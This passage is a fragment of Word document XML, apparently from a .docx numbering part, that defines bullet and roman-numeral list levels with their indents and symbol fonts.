        <w:ind w:left="5760" w:hanging="360"/>
      </w:pPr>
    </w:lvl>
    <w:lvl w:ilvl="8" w:tplc="268047F6">
      <w:start w:val="1"/>
      <w:numFmt w:val="lowerRoman"/>
      <w:lvlText w:val="%9."/>
      <w:lvlJc w:val="right"/>
      <w:pPr>
        <w:ind w:left="6480" w:hanging="180"/>
      </w:pPr>
    </w:lvl>
  </w:abstractNum>
  <w:abstractNum w:abstractNumId="5" w15:restartNumberingAfterBreak="0">
    <w:nsid w:val="14012035"/>
    <w:multiLevelType w:val="hybridMultilevel"/>
    <w:tmpl w:val="FFFFFFFF"/>
    <w:lvl w:ilvl="0" w:tplc="922888C4">
      <w:start w:val="1"/>
      <w:numFmt w:val="bullet"/>
      <w:lvlText w:val=""/>
      <w:lvlJc w:val="left"/>
      <w:pPr>
        <w:ind w:left="720" w:hanging="360"/>
      </w:pPr>
      <w:rPr>
        <w:rFonts w:ascii="Symbol" w:hAnsi="Symbol" w:hint="default"/>
      </w:rPr>
    </w:lvl>
    <w:lvl w:ilvl="1" w:tplc="54A81B2A">
      <w:start w:val="1"/>
      <w:numFmt w:val="bullet"/>
      <w:lvlText w:val="o"/>
      <w:lvlJc w:val="left"/>
      <w:pPr>
        <w:ind w:left="1440" w:hanging="360"/>
      </w:pPr>
      <w:rPr>
        <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New" w:hint="default"/>
      </w:rPr>
    </w:lvl>
    <w:lvl w:ilvl="2" w:tplc="871CC02A">
      <w:start w:val="1"/>
      <w:numFmt w:val="bullet"/>
      <w:lvlText w:val=""/>
      <w:lvlJc w:val="left"/>
      <w:pPr>
        <w:ind w:left="2160" w:hanging="360"/>
      </w:pPr>
      <w:rPr>
        <w:rFonts w:ascii="Wingdings" w:hAnsi="Wingdings" w:hint="default"/>
      </w:rPr>
    </w:lvl>
    <w:lvl w:ilvl="3" w:tplc="B31E2056">
      <w:start w:val="1"/>
      <w:numFmt w:val="bullet"/>
      <w:lvlText w:val=""/>
      <w:lvlJc w:val="left"/>
      <w:pPr>
        <w:ind w:left="2880" w:hanging="360"/>
      </w:pPr>
      <w:rPr>
        <w:rFonts w:ascii="Symbol" w:hAnsi="Symbol" w:hint="default"/>
      </w:rPr>
    </w:lvl>
    <w:lvl w:ilvl="4" w:tplc="CD8299AA">
      <w:start w:val="1"/>
      <w:numFmt w:val="bullet"/>
      <w:lvlText w:val="o"/>
      <w:lvlJc w:val="left"/>
      <w:pPr>
        <w:ind w:left="3600" w:hanging="360"/>
      </w:pPr>
      <w:rPr>
        <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New" w:hint="default"/>
      </w:rPr>
    </w:lvl>
    <w:lvl w:ilvl="5" w:tplc="A0185A50">
      <w:start w:val="1"/>
      <w:numFmt w:val="bullet"/>
      <w:lvlText w:val=""/>
      <w:lvlJc w:val="left"/>
      <w:pPr>
        <w:ind w:left="4320" w:hanging="360"/>
      </w:pPr>
      <w:rPr>
        <w:rFonts w:ascii="Wingdings" w:hAnsi="Wingdings" w:hint="default"/>
      </w:rPr>
    </w:lvl>
    <w:lvl w:ilvl="6" w:tplc="16C25BE0">
      <w:start w:val="1"/>
      <w:numFmt w:val="bullet"/>
      <w:lvlText w:val=""/>
      <w:lvlJc w:val="left"/>
      <w:pPr>
        <w:ind w:left="5040" w:hanging="360"/>
      </w:pPr>
      <w:rPr>
        <w:rFonts w:ascii="Symbol" w:hAnsi="Symbol" w:hint="default"/>
      </w:rPr>
    </w:lvl>
    <w:lvl w:ilvl="7" w:tplc="1ACA14D4">
      <w:start w:val="1"/>
      <w:numFmt w:val="bullet"/>
      <w:lvlText w:val="o"/>
      <w:lvlJc w:val="left"/>
      <w:pPr>
        <w:ind w:left="5760" w:hanging="360"/>
      </w:pPr>
      <w:rPr>
        <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New" w:hint="default"/>
      </w:rPr>
    </w:lvl>
    <w:lvl w:ilvl="8" w:tplc="78A037FA">
      <w:start w:val="1"/>
      <w:numFmt w:val="bullet"/>
      <w:lvlText w:val=""/>
      <w:lvlJc w:val="left"/>
      <w:pPr>
        <w:ind w:left="6480" w:hanging="360"/>
      </w:pPr>
      <w:rPr>
        <w:rFonts w:ascii="Wingdings" w:hAnsi="Wingdings" w:hint="default"/>
      </w:rPr>
    </w:lvl>
  </w:abstractNum>
  <w:abstractNum w:abstractNumId="6" w15:restartNumberingAfterBreak="0">
    <w:nsid w:val="14B8079D"/>
    <w:multiLevelType w:val="hybridMultilevel"/>
    <w:tmpl w:val="752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E41EB"/>
    <w:multiLevelType w:val="hybridMultilevel"/>
    <w:tmpl w:val="A0A8F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338E7"/>
    <w:multiLevelType w:val="hybridMultilevel"/>
    <w:tmpl w:val="FFFFFFFF"/>
    <w:lvl w:ilvl="0" w:tplc="85269E9A">
      <w:start w:val="1"/>
      <w:numFmt w:val="bullet"/>
      <w:lvlText w:val=""/>
      <w:lvlJc w:val="left"/>
      <w:pPr>
        <w:ind w:left="720" w:hanging="360"/>
      </w:pPr>
      <w:rPr>
        <w:rFonts w:ascii="Symbol" w:hAnsi="Symbol" w:hint="default"/>
      </w:rPr>
    </w:lvl>
    <w:lvl w:ilvl="1" w:tplc="0916D6BA">
      <w:start w:val="1"/>
      <w:numFmt w:val="bullet"/>
      <w:lvlText w:val="o"/>
      <w:lvlJc w:val="left"/>
      <w:pPr>
        <w:ind w:left="1440" w:hanging="360"/>
      </w:pPr>
      <w:rPr>
        <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New" w:hint="default"/>
      </w:rPr>
    </w:lvl>
    <w:lvl w:ilvl="2" w:tplc="277C26EC">
      <w:start w:val="1"/>
      <w:numFmt w:val="bullet"/>
      <w:lvlText w:val=""/>
      <w:lvlJc w:val="left"/>
      <w:pPr>
        <w:ind w:left="2160" w:hanging="360"/>
      </w:pPr>
      <w:rPr>
        <w:rFonts w:ascii="Wingdings" w:hAnsi="Wingdings" w:hint="default"/>
      </w:rPr>
    </w:lvl>
    <w:lvl w:ilvl="3" w:tplc="9E4C552A">
      <w:start w:val="1"/>
      <w:numFmt w:val="bullet"/>
      <w:lvlText w:val=""/>
      <w:lvlJc w:val="left"/>
      <w:pPr>
        <w:ind w:left="2880" w:hanging="360"/>
      </w:pPr>
      <w:rPr>
        <w:rFonts w:ascii="Symbol" w:hAnsi="Symbol" w:hint="default"/>
      </w:rPr>
    </w:lvl>
    <w:lvl w:ilvl="4" w:tplc="B5CE133A">
      <w:start w:val="1"/>
      <w:numFmt w:val="bullet"/>
      <w:lvlText w:val="o"/>
      <w:lvlJc w:val="left"/>
      <w:pPr>
        <w:ind w:left="3600" w:hanging="360"/>
      </w:pPr>
      <w:rPr>
        <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New" w:hint="default"/>
      </w:rPr>
    </w:lvl>
    <w:lvl w:ilvl="5" w:tplc="F4C48ABA">
      <w:start w:val="1"/>
      <w:numFmt w:val="bullet"/>
      <w:lvlText w:val=""/>
      <w:lvlJc w:val="left"/>
      <w:pPr>
        <w:ind w:left="4320" w:hanging="360"/>
      </w:pPr>
      <w:rPr>
        <w:rFonts w:ascii="Wingdings" w:hAnsi="Wingdings" w:hint="default"/>
      </w:rPr>
    </w:lvl>
    <w:lvl w:ilvl="6" w:tplc="706409DC">
      <w:start w:val="1"/>
      <w:numFmt w:val="bullet"/>
      <w:lvlText w:val=""/>
      <w:lvlJc w:val="left"/>
      <w:pPr>
        <w:ind w:left="5040" w:hanging="360"/>
      </w:pPr>
      <w:rPr>
        <w:rFonts w:ascii="Symbol" w:hAnsi="Symbol" w:hint="default"/>
      </w:rPr>
    </w:lvl>
    <w:lvl w:ilvl="7" w:tplc="BFB8986E">
      <w:start w:val="1"/>
      <w:numFmt w:val="bullet"/>
      <w:lvlText w:val="o"/>
      <w:lvlJc w:val="left"/>
      <w:pPr>
        <w:ind w:left="5760" w:hanging="360"/>
      </w:pPr>
      <w:rPr>
        <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New" w:hint="default"/>
      </w:rPr>
    </w:lvl>
    <w:lvl w:ilvl="8" w:tplc="2976E7F0">
      <w:start w:val="1"/>
      <w:numFmt w:val="bullet"/>
      <w:lvlText w:val=""/>
      <w:lvlJc w:val="left"/>
      <w:pPr>
        <w:ind w:left="6480" w:hanging="360"/>
      </w:pPr>
      <w:rPr>
        <w:rFonts w:ascii="Wingdings" w:hAnsi="Wingdings" w:hint="default"/>
      </w:rPr>
    </w:lvl>
  </w:abstractNum>
  <w:abstractNum w:abstractNumId="9" w15:restartNumberingAfterBreak="0">
    <w:nsid w:val="17D5095D"/>
    <w:multiLevelType w:val="hybridMultilevel"/>
    <w:tmpl w:val="12E06334"/>
    <w:lvl w:ilvl="0" w:tplc="DC6A5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694D"/>
    <w:multiLevelType w:val="hybridMultilevel"/>
    <w:tmpl w:val="FFFFFFFF"/>
    <w:lvl w:ilvl="0" w:tplc="0DA4BE72">
      <w:start w:val="1"/>
      <w:numFmt w:val="bullet"/>
      <w:lvlText w:val=""/>
      <w:lvlJc w:val="left"/>
      <w:pPr>
        <w:ind w:left="720" w:hanging="360"/>
      </w:pPr>
      <w:rPr>
        <w:rFonts w:ascii="Symbol" w:hAnsi="Symbol" w:hint="default"/>
      </w:rPr>
    </w:lvl>
    <w:lvl w:ilvl="1" w:tplc="C4C2C218">
      <w:start w:val="1"/>
      <w:numFmt w:val="bullet"/>
      <w:lvlText w:val="o"/>
      <w:lvlJc w:val="left"/>
      <w:pPr>
        <w:ind w:left="1440" w:hanging="360"/>
      </w:pPr>
      <w:rPr>
        <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New" w:hint="default"/>
      </w:rPr>
    </w:lvl>
    <w:lvl w:ilvl="2" w:tplc="AA062C84">
      <w:start w:val="1"/>
      <w:numFmt w:val="bullet"/>
      <w:lvlText w:val=""/>
      <w:lvlJc w:val="left"/>
      <w:pPr>
        <w:ind w:left="2160" w:hanging="360"/>
      </w:pPr>
      <w:rPr>
        <w:rFonts w:ascii="Wingdings" w:hAnsi="Wingdings" w:hint="default"/>
      </w:rPr>
    </w:lvl>
    <w:lvl w:ilvl="3" w:tplc="51D4A346">
      <w:start w:val="1"/>
      <w:numFmt w:val="bullet"/>
      <w:lvlText w:val=""/>
      <w:lvlJc w:val="left"/>
      <w:pPr>
        <w:ind w:left="2880" w:hanging="360"/>
      </w:pPr>
      <w:rPr>
        <w:rFonts w:ascii="Symbol" w:hAnsi="Symbol" w:hint="default"/>
      </w:rPr>
    </w:lvl>
    <w:lvl w:ilvl="4" w:tplc="6540AD94">
      <w:start w:val="1"/>
      <w:numFmt w:val="bullet"/>
      <w:lvlText w:val="o"/>
      <w:lvlJc w:val="left"/>
      <w:pPr>
        <w:ind w:left="3600" w:hanging="360"/>
      </w:pPr>
      <w:rPr>
        <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New" w:hint="default"/>
      </w:rPr>
    </w:lvl>
    <w:lvl w:ilvl="5" w:tplc="9C10C118">
      <w:start w:val="1"/>
      <w:numFmt w:val="bullet"/>
      <w:lvlText w:val=""/>
      <w:lvlJc w:val="left"/>
      <w:pPr>
        <w:ind w:left="4320" w:hanging="360"/>
      </w:pPr>
      <w:rPr>
        <w:rFonts w:ascii="Wingdings" w:hAnsi="Wingdings" w:hint="default"/>
      </w:rPr>
    </w:lvl>
    <w:lvl w:ilvl="6" w:tplc="3938729C">
      <w:start w:val="1"/>
      <w:numFmt w:val="bullet"/>
      <w:lvlText w:val=""/>
      <w:lvlJc w:val="left"/>
      <w:pPr>
        <w:ind w:left="5040" w:hanging="360"/>
      </w:pPr>
      <w:rPr>
        <w:rFonts w:ascii="Symbol" w:hAnsi="Symbol" w:hint="default"/>
      </w:rPr>
    </w:lvl>
    <w:lvl w:ilvl="7" w:tplc="27FE8684">
      <w:start w:val="1"/>
      <w:numFmt w:val="bullet"/>
      <w:lvlText w:val="o"/>
      <w:lvlJc w:val="left"/>
      <w:pPr>
        <w:ind w:left="5760" w:hanging="360"/>
      </w:pPr>
      <w:rPr>
        <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New" w:hint="default"/>
      </w:rPr>
    </w:lvl>
    <w:lvl w:ilvl="8" w:tplc="2056DC24">
      <w:start w:val="1"/>
      <w:numFmt w:val="bullet"/>
      <w:lvlText w:val=""/>
      <w:lvlJc w:val="left"/>
      <w:pPr>
        <w:ind w:left="6480" w:hanging="360"/>
      </w:pPr>
      <w:rPr>
        <w:rFonts w:ascii="Wingdings" w:hAnsi="Wingdings" w:hint="default"/>
      </w:rPr>
    </w:lvl>
  </w:abstractNum>
  <w:abstractNum w:abstractNumId="11" w15:restartNumberingAfterBreak="0">
    <w:nsid w:val="1866460C"/>
    <w:multiLevelType w:val="hybridMultilevel"/>
    <w:tmpl w:val="FFFFFFFF"/>
    <w:lvl w:ilvl="0" w:tplc="0680CF1A">
      <w:start w:val="1"/>
      <w:numFmt w:val="bullet"/>
      <w:lvlText w:val=""/>
      <w:lvlJc w:val="left"/>
      <w:pPr>
        <w:ind w:left="720" w:hanging="360"/>
      </w:pPr>
      <w:rPr>
        <w:rFonts w:ascii="Symbol" w:hAnsi="Symbol" w:hint="default"/>
      </w:rPr>
    </w:lvl>
    <w:lvl w:ilvl="1" w:tplc="C7208988">
      <w:start w:val="1"/>
      <w:numFmt w:val="bullet"/>
      <w:lvlText w:val="o"/>
      <w:lvlJc w:val="left"/>
      <w:pPr>
        <w:ind w:left="1440" w:hanging="360"/>
      </w:pPr>
      <w:rPr>
        <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New" w:hint="default"/>
      </w:rPr>
    </w:lvl>
    <w:lvl w:ilvl="2" w:tplc="A53EB8F8">
      <w:start w:val="1"/>
      <w:numFmt w:val="bullet"/>
      <w:lvlText w:val=""/>
      <w:lvlJc w:val="left"/>
      <w:pPr>
        <w:ind w:left="2160" w:hanging="360"/>
      </w:pPr>
      <w:rPr>
        <w:rFonts w:ascii="Wingdings" w:hAnsi="Wingdings" w:hint="default"/>
      </w:rPr>
    </w:lvl>
    <w:lvl w:ilvl="3" w:tplc="AA9CC23C">
      <w:start w:val="1"/>
      <w:numFmt w:val="bullet"/>
      <w:lvlText w:val=""/>
      <w:lvlJc w:val="left"/>
      <w:pPr>
        <w:ind w:left="2880" w:hanging="360"/>
      </w:pPr>
      <w:rPr>
        <w:rFonts w:ascii="Symbol" w:hAnsi="Symbol" w:hint="default"/>
      </w:rPr>
    </w:lvl>
    <w:lvl w:ilvl="4" w:tplc="10C84F82">
      <w:start w:val="1"/>
      <w:numFmt w:val="bullet"/>
      <w:lvlText w:val="o"/>
      <w:lvlJc w:val="left"/>
      <w:pPr>
        <w:ind w:left="3600" w:hanging="360"/>
      </w:pPr>
      <w:rPr>
        <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New" w:hint="default"/>
      </w:rPr>
    </w:lvl>
    <w:lvl w:ilvl="5" w:tplc="A75851B8">
      <w:start w:val="1"/>
      <w:numFmt w:val="bullet"/>
      <w:lvlText w:val=""/>
      <w:lvlJc w:val="left"/>
      <w:pPr>
        <w:ind w:left="4320" w:hanging="360"/>
      </w:pPr>
      <w:rPr>
        <w:rFonts w:ascii="Wingdings" w:hAnsi="Wingdings" w:hint="default"/>
      </w:rPr>
    </w:lvl>
    <w:lvl w:ilvl="6" w:tplc="4E8CC61A">
      <w:start w:val="1"/>
      <w:numFmt w:val="bullet"/>
      <w:lvlText w:val=""/>
      <w:lvlJc w:val="left"/>
      <w:pPr>
        <w:ind w:left="5040" w:hanging="360"/>
      </w:pPr>
      <w:rPr>
        <w:rFonts w:ascii="Symbol" w:hAnsi="Symbol" w:hint="default"/>
      </w:rPr>
    </w:lvl>
    <w:lvl w:ilvl="7" w:tplc="7F2AD238">
      <w:start w:val="1"/>
      <w:numFmt w:val="bullet"/>
      <w:lvlText w:val="o"/>
      <w:lvlJc w:val="left"/>
      <w:pPr>
        <w:ind w:left="5760" w:hanging="360"/>
      </w:pPr>
      <w:rPr>
        <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New" w:hint="default"/>
      </w:rPr>
    </w:lvl>
    <w:lvl w:ilvl="8" w:tplc="2EFE0D20">
      <w:start w:val="1"/>
      <w:numFmt w:val="bullet"/>
      <w:lvlText w:val=""/>
      <w:lvlJc w:val="left"/>
      <w:pPr>
        <w:ind w:left="6480" w:hanging="360"/>
      </w:pPr>
      <w:rPr>
        <w:rFonts w:ascii="Wingdings" w:hAnsi="Wingdings" w:hint="default"/>
      </w:rPr>
    </w:lvl>
  </w:abstractNum>
  <w:abstractNum w:abstractNumId="12" w15:restartNumberingAfterBreak="0">
    <w:nsid w:val="19532EE6"/>
    <w:multiLevelType w:val="hybridMultilevel"/>
    <w:tmpl w:val="FFFFFFFF"/>
    <w:lvl w:ilvl="0" w:tplc="DC6A5920">
      <w:start w:val="1"/>
      <w:numFmt w:val="bullet"/>
      <w:lvlText w:val=""/>
      <w:lvlJc w:val="left"/>
      <w:pPr>
        <w:ind w:left="720" w:hanging="360"/>
      </w:pPr>
      <w:rPr>
        <w:rFonts w:ascii="Symbol" w:hAnsi="Symbol" w:hint="default"/>
      </w:rPr>
    </w:lvl>
    <w:lvl w:ilvl="1" w:tplc="929E1986">
      <w:start w:val="1"/>
      <w:numFmt w:val="bullet"/>
      <w:lvlText w:val="o"/>
      <w:lvlJc w:val="left"/>
      <w:pPr>
        <w:ind w:left="1440" w:hanging="360"/>
      </w:pPr>
      <w:rPr>
        <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New" w:hint="default"/>
      </w:rPr>
    </w:lvl>
    <w:lvl w:ilvl="2" w:tplc="6AB4FEDA">
      <w:start w:val="1"/>
      <w:numFmt w:val="bullet"/>
      <w:lvlText w:val=""/>
      <w:lvlJc w:val="left"/>
      <w:pPr>
        <w:ind w:left="2160" w:hanging="360"/>
      </w:pPr>
      <w:rPr>
        <w:rFonts w:ascii="Wingdings" w:hAnsi="Wingdings" w:hint="default"/>
      </w:rPr>
    </w:lvl>
    <w:lvl w:ilvl="3" w:tplc="A842845C">
      <w:start w:val="1"/>
      <w:numFmt w:val="bullet"/>
      <w:lvlText w:val=""/>
      <w:lvlJc w:val="left"/>
      <w:pPr>
        <w:ind w:left="2880" w:hanging="360"/>
      </w:pPr>
      <w:rPr>
        <w:rFonts w:ascii="Symbol" w:hAnsi="Symbol" w:hint="default"/>
      </w:rPr>
    </w:lvl>
    <w:lvl w:ilvl="4" w:tplc="386040FA">
      <w:start w:val="1"/>
      <w:numFmt w:val="bullet"/>
      <w:lvlText w:val="o"/>
      <w:lvlJc w:val="left"/>
      <w:pPr>
        <w:ind w:left="3600" w:hanging="360"/>
      </w:pPr>
      <w:rPr>
        <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New" w:hint="default"/>
      </w:rPr>
    </w:lvl>
    <w:lvl w:ilvl="5" w:tplc="4C281F88">
      <w:start w:val="1"/>
      <w:numFmt w:val="bullet"/>
      <w:lvlText w:val=""/>
      <w:lvlJc w:val="left"/>
      <w:pPr>
        <w:ind w:left="4320" w:hanging="360"/>
      </w:pPr>
      <w:rPr>
        <w:rFonts w:ascii="Wingdings" w:hAnsi="Wingdings" w:hint="default"/>
      </w:rPr>
    </w:lvl>
    <w:lvl w:ilvl="6" w:tplc="F3D27916">
      <w:start w:val="1"/>
      <w:numFmt w:val="bullet"/>
      <w:lvlText w:val=""/>
      <w:lvlJc w:val="left"/>
      <w:pPr>
        <w:ind w:left="5040" w:hanging="360"/>
      </w:pPr>
      <w:rPr>
        <w:rFonts w:ascii="Symbol" w:hAnsi="Symbol" w:hint="default"/>
      </w:rPr>
    </w:lvl>
    <w:lvl w:ilvl="7" w:tplc="A1523B0A">
      <w:start w:val="1"/>
      <w:numFmt w:val="bullet"/>
      <w:lvlText w:val="o"/>
      <w:lvlJc w:val="left"/>
      <w:pPr>
        <w:ind w:left="5760" w:hanging="360"/>
      </w:pPr>
      <w:rPr>
        <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New" w:hint="default"/>
      </w:rPr>
    </w:lvl>
    <w:lvl w:ilvl="8" w:tplc="6E622B5C">
      <w:start w:val="1"/>
      <w:numFmt w:val="bullet"/>
      <w:lvlText w:val=""/>
      <w:lvlJc w:val="left"/>
      <w:pPr>
        <w:ind w:left="6480" w:hanging="360"/>
      </w:pPr>
      <w:rPr>
        <w:rFonts w:ascii="Wingdings" w:hAnsi="Wingdings" w:hint="default"/>
      </w:rPr>
    </w:lvl>
  </w:abstractNum>
  <w:abstractNum w:abstractNumId="13" w15:restartNumberingAfterBreak="0">
    <w:nsid w:val="21E03880"/>
    <w:multiLevelType w:val="hybridMultilevel"/>
    <w:tmpl w:val="FFFFFFFF"/>
    <w:lvl w:ilvl="0" w:tplc="8D103B2E">
      <w:start w:val="1"/>
      <w:numFmt w:val="bullet"/>
      <w:lvlText w:val=""/>
      <w:lvlJc w:val="left"/>
      <w:pPr>
        <w:ind w:left="720" w:hanging="360"/>
      </w:pPr>
      <w:rPr>
        <w:rFonts w:ascii="Symbol" w:hAnsi="Symbol" w:hint="default"/>
      </w:rPr>
    </w:lvl>
    <w:lvl w:ilvl="1" w:tplc="D1E4BE22">
      <w:start w:val="1"/>
      <w:numFmt w:val="bullet"/>
      <w:lvlText w:val="o"/>
      <w:lvlJc w:val="left"/>
      <w:pPr>
        <w:ind w:left="1440" w:hanging="360"/>
      </w:pPr>
      <w:rPr>
        <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New" w:hint="default"/>
      </w:rPr>
    </w:lvl>
    <w:lvl w:ilvl="2" w:tplc="C23AA61C">
      <w:start w:val="1"/>
      <w:numFmt w:val="bullet"/>
      <w:lvlText w:val=""/>
      <w:lvlJc w:val="left"/>
      <w:pPr>
        <w:ind w:left="2160" w:hanging="360"/>
      </w:pPr>
      <w:rPr>
        <w:rFonts w:ascii="Wingdings" w:hAnsi="Wingdings" w:hint="default"/>
      </w:rPr>
    </w:lvl>
    <w:lvl w:ilvl="3" w:tplc="1464A19C">
      <w:start w:val="1"/>
      <w:numFmt w:val="bullet"/>
      <w:lvlText w:val=""/>
      <w:lvlJc w:val="left"/>
      <w:pPr>
        <w:ind w:left="2880" w:hanging="360"/>
      </w:pPr>
      <w:rPr>
        <w:rFonts w:ascii="Symbol" w:hAnsi="Symbol" w:hint="default"/>
      </w:rPr>
    </w:lvl>
    <w:lvl w:ilvl="4" w:tplc="8314F53E">
      <w:start w:val="1"/>
      <w:numFmt w:val="bullet"/>
      <w:lvlText w:val="o"/>
      <w:lvlJc w:val="left"/>
      <w:pPr>
        <w:ind w:left="3600" w:hanging="360"/>
      </w:pPr>
      <w:rPr>
        <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New" w:hint="default"/>
      </w:rPr>
    </w:lvl>
    <w:lvl w:ilvl="5" w:tplc="D32CCB12">
      <w:start w:val="1"/>
      <w:numFmt w:val="bullet"/>
      <w:lvlText w:val=""/>
      <w:lvlJc w:val="left"/>
      <w:pPr>
        <w:ind w:left="4320" w:hanging="360"/>
      </w:pPr>
      <w:rPr>
        <w:rFonts w:ascii="Wingdings" w:hAnsi="Wingdings" w:hint="default"/>
      </w:rPr>
    </w:lvl>
    <w:lvl w:ilvl="6" w:tplc="FD207B5C">
      <w:start w:val="1"/>
      <w:numFmt w:val="bullet"/>
      <w:lvlText w:val=""/>
      <w:lvlJc w:val="left"/>
      <w:pPr>
        <w:ind w:left="5040" w:hanging="360"/>
      </w:pPr>
      <w:rPr>
        <w:rFonts w:ascii="Symbol" w:hAnsi="Symbol" w:hint="default"/>
      </w:rPr>
    </w:lvl>
    <w:lvl w:ilvl="7" w:tplc="DFE282B6">
      <w:start w:val="1"/>
      <w:numFmt w:val="bullet"/>
      <w:lvlText w:val="o"/>
      <w:lvlJc w:val="left"/>
      <w:pPr>
        <w:ind w:left="5760" w:hanging="360"/>
      </w:pPr>
      <w:rPr>
        <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New" w:hint="default"/>
      </w:rPr>
    </w:lvl>
    <w:lvl w:ilvl="8" w:tplc="0B10CD5C">
      <w:start w:val="1"/>
      <w:numFmt w:val="bullet"/>
      <w:lvlText w:val=""/>
      <w:lvlJc w:val="left"/>
      <w:pPr>
        <w:ind w:left="6480" w:hanging="360"/>
      </w:pPr>
      <w:rPr>
        <w:rFonts w:ascii="Wingdings" w:hAnsi="Wingdings" w:hint="default"/>
      </w:rPr>
    </w:lvl>
  </w:abstractNum>
  <w:abstractNum w:abstractNumId="14" w15:restartNumberingAfterBreak="0">
    <w:nsid w:val="27715967"/>
    <w:multiLevelType w:val="hybridMultilevel"/>
    <w:tmpl w:val="FFFFFFFF"/>
    <w:lvl w:ilvl="0" w:tplc="06123096">
      <w:start w:val="1"/>
      <w:numFmt w:val="bullet"/>
      <w:lvlText w:val=""/>
      <w:lvlJc w:val="left"/>
      <w:pPr>
        <w:ind w:left="720" w:hanging="360"/>
      </w:pPr>
      <w:rPr>
        <w:rFonts w:ascii="Symbol" w:hAnsi="Symbol" w:hint="default"/>
      </w:rPr>
    </w:lvl>
    <w:lvl w:ilvl="1" w:tplc="4468A84A">
      <w:start w:val="1"/>
      <w:numFmt w:val="bullet"/>
      <w:lvlText w:val="o"/>
      <w:lvlJc w:val="left"/>
      <w:pPr>
        <w:ind w:left="1440" w:hanging="360"/>
      </w:pPr>
      <w:rPr>
        <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New" w:hint="default"/>
      </w:rPr>
    </w:lvl>
    <w:lvl w:ilvl="2" w:tplc="B1848914">
      <w:start w:val="1"/>
      <w:numFmt w:val="bullet"/>
      <w:lvlText w:val=""/>
      <w:lvlJc w:val="left"/>
      <w:pPr>
        <w:ind w:left="2160" w:hanging="360"/>
      </w:pPr>
      <w:rPr>
        <w:rFonts w:ascii="Wingdings" w:hAnsi="Wingdings" w:hint="default"/>
      </w:rPr>
    </w:lvl>
    <w:lvl w:ilvl="3" w:tplc="3622103E">
      <w:start w:val="1"/>
      <w:numFmt w:val="bullet"/>
      <w:lvlText w:val=""/>
      <w:lvlJc w:val="left"/>
      <w:pPr>
        <w:ind w:left="2880" w:hanging="360"/>
      </w:pPr>
      <w:rPr>
        <w:rFonts w:ascii="Symbol" w:hAnsi="Symbol" w:hint="default"/>
      </w:rPr>
    </w:lvl>
    <w:lvl w:ilvl="4" w:tplc="9902571E">
      <w:start w:val="1"/>
      <w:numFmt w:val="bullet"/>
      <w:lvlText w:val="o"/>
      <w:lvlJc w:val="left"/>
      <w:pPr>
        <w:ind w:left="3600" w:hanging="360"/>
      </w:pPr>
      <w:rPr>
        <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New" w:hint="default"/>
      </w:rPr>
    </w:lvl>
    <w:lvl w:ilvl="5" w:tplc="7D743532">
      <w:start w:val="1"/>
      <w:numFmt w:val="bullet"/>
      <w:lvlText w:val=""/>
      <w:lvlJc w:val="left"/>
      <w:pPr>
        <w:ind w:left="4320" w:hanging="360"/>
      </w:pPr>
      <w:rPr>
        <w:rFonts w:ascii="Wingdings" w:hAnsi="Wingdings" w:hint="default"/>
      </w:rPr>
    </w:lvl>
    <w:lvl w:ilvl="6" w:tplc="49E8C966">
      <w:start w:val="1"/>
      <w:numFmt w:val="bullet"/>
      <w:lvlText w:val=""/>
      <w:lvlJc w:val="left"/>
      <w:pPr>
        <w:ind w:left="5040" w:hanging="360"/>
      </w:pPr>
      <w:rPr>
        <w:rFonts w:ascii="Symbol" w:hAnsi="Symbol" w:hint="default"/>
      </w:rPr>
    </w:lvl>
    <w:lvl w:ilvl="7" w:tplc="0B8665A2">
      <w:start w:val="1"/>
      <w:numFmt w:val="bullet"/>
      <w:lvlText w:val="o"/>
      <w:lvlJc w:val="left"/>
      <w:pPr>
        <w:ind w:left="5760" w:hanging="360"/>
      </w:pPr>
      <w:rPr>
        <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New" w:hint="default"/>
      </w:rPr>
    </w:lvl>
    <w:lvl w:ilvl="8" w:tplc="6100B962">
      <w:start w:val="1"/>
      <w:numFmt w:val="bullet"/>
      <w:lvlText w:val=""/>
      <w:lvlJc w:val="left"/>
      <w:pPr>
        <w:ind w:left="6480" w:hanging="360"/>
      </w:pPr>
      <w:rPr>
        <w:rFonts w:ascii="Wingdings" w:hAnsi="Wingdings" w:hint="default"/>
      </w:rPr>
    </w:lvl>
  </w:abstractNum>
  <w:abstractNum w:abstractNumId="15" w15:restartNumberingAfterBreak="0">
    <w:nsid w:val="2998554B"/>
    <w:multiLevelType w:val="hybridMultilevel"/>
    <w:tmpl w:val="E60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D7CCF"/>
    <w:multiLevelType w:val="hybridMultilevel"/>
    <w:tmpl w:val="FFFFFFFF"/>
    <w:lvl w:ilvl="0" w:tplc="CB02A8F4">
      <w:start w:val="1"/>
      <w:numFmt w:val="bullet"/>
      <w:lvlText w:val=""/>
      <w:lvlJc w:val="left"/>
      <w:pPr>
        <w:ind w:left="720" w:hanging="360"/>
      </w:pPr>
      <w:rPr>
        <w:rFonts w:ascii="Symbol" w:hAnsi="Symbol" w:hint="default"/>
      </w:rPr>
    </w:lvl>
    <w:lvl w:ilvl="1" w:tplc="08A29888">
      <w:start w:val="1"/>
      <w:numFmt w:val="bullet"/>
      <w:lvlText w:val="o"/>
      <w:lvlJc w:val="left"/>
      <w:pPr>
        <w:ind w:left="1440" w:hanging="360"/>
      </w:pPr>
      <w:rPr>
        <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New" w:hint="default"/>
      </w:rPr>
    </w:lvl>
    <w:lvl w:ilvl="2" w:tplc="189091A0">
      <w:start w:val="1"/>
      <w:numFmt w:val="bullet"/>
      <w:lvlText w:val=""/>
